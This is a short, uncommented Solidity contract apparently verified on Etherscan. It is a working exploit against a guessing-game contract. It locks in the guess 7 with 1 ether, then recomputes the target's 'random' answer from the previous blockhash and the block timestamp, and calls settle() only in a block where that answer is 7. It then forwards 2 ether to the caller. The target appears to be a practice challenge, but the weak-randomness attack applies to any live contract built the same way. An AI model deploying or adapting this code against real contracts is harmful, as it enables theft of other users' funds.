/**
 *Submitted for verification at Etherscan.io on 2022-04-03
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract Getit2 {

    receive() external payable {
    }

    function lockInGuessHere(address _contract) public payable {
        bool success;
        bytes memory returndata;
        (success, returndata) = _contract.call{value: 1 ether}(abi.encodeWithSignature("lockInGuess(uint8)", 7));
        require(success, string (returndata));
    }

    function settleHere(address _contract) public payable {
        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        require(answer == 7, "Answer was not 7 this time");
        bool success;
        bytes memory returndata;
        (success, returndata) = _contract.call(abi.encodeWithSignature("settle()"));
        require(success, string (returndata));
        (success, returndata) = msg.sender.call{value: 2 ether}("");
        require(success, string (returndata));
    }
}